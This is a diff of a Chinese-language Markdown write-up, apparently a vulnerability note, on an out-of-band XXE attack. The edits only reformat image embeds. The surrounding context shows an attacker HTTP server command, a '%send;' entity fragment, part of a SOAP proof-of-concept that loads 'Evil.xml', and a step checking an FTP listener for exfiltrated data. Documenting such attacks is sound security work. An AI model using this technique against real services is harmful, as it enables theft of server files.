@@ -173,7 +173,7 @@ if __name__ == '__main__':
     main()
 ```
 
-![image](https://user-images.githubusercontent.com/84888757/223007526-377dc534-07e6-4368-b1bb-363ceff52b2d.png)
+<div align=center ><img width="800" src="https://user-images.githubusercontent.com/84888757/223007526-377dc534-07e6-4368-b1bb-363ceff52b2d.png" /></div>
 
 ### 2.3.2 攻击机开启一个http服务
 ```bash
@@ -191,7 +191,8 @@ python3 -m http.server 9999
 %send;
 ```
 
-![image](https://user-images.githubusercontent.com/84888757/223007831-d55bdf34-2cca-4527-8457-95417165bc05.png)
+<div align=center ><img width="600" src="https://user-images.githubusercontent.com/84888757/223007831-d55bdf34-2cca-4527-8457-95417165bc05.png" /></div>
+
 
 ### 2.3.3 构造 `poc` 去加载 `Evil.xml` 文件
 ```
@@ -216,6 +217,9 @@ User-Agent: Apache-HttpClient/4.5.5 (Java/16.0.1)
    </soapenv:Body>
 </soapenv:Envelope>
 ```
+
+![image](https://user-images.githubusercontent.com/84888757/223010863-ae921670-d9a7-4829-9501-c456b05f943e.png)
+
 
 ### 2.3.4 查看FTP服务监听
 
